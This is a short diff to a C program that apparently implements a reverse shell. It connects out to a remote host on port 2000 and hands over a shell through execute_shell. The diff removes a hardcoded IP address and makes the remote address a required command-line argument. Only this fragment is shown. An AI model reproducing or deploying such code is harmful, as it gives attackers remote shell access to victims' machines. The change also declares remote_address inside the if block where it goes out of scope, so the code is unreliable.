@@ -5,7 +5,6 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define REMOTE_ADDRESS "188.166.177.208"
 #define REMOTE_PORT 2000
 #define POLL_DURATION 10
 
@@ -14,12 +13,16 @@ void execute_shell(int socket_fd);
 
 int main(int argc, char** argv)
 {
-	if(argc < 2){
-		char * remote_address = REMOTE_ADDRESS;
+	if(argc == 2)
+    {
+        char * remote_address = argv[1];
 	}
-	else{
-		char * remote_address = argv[1];
+	else
+    {
+        printf("ERROR NO REMOTE SUPPLIED\n");
+        exit(1);
 	}
+    
 	int sock;
     while( (sock = attempt_connection_to_server()) == -1)
 	{
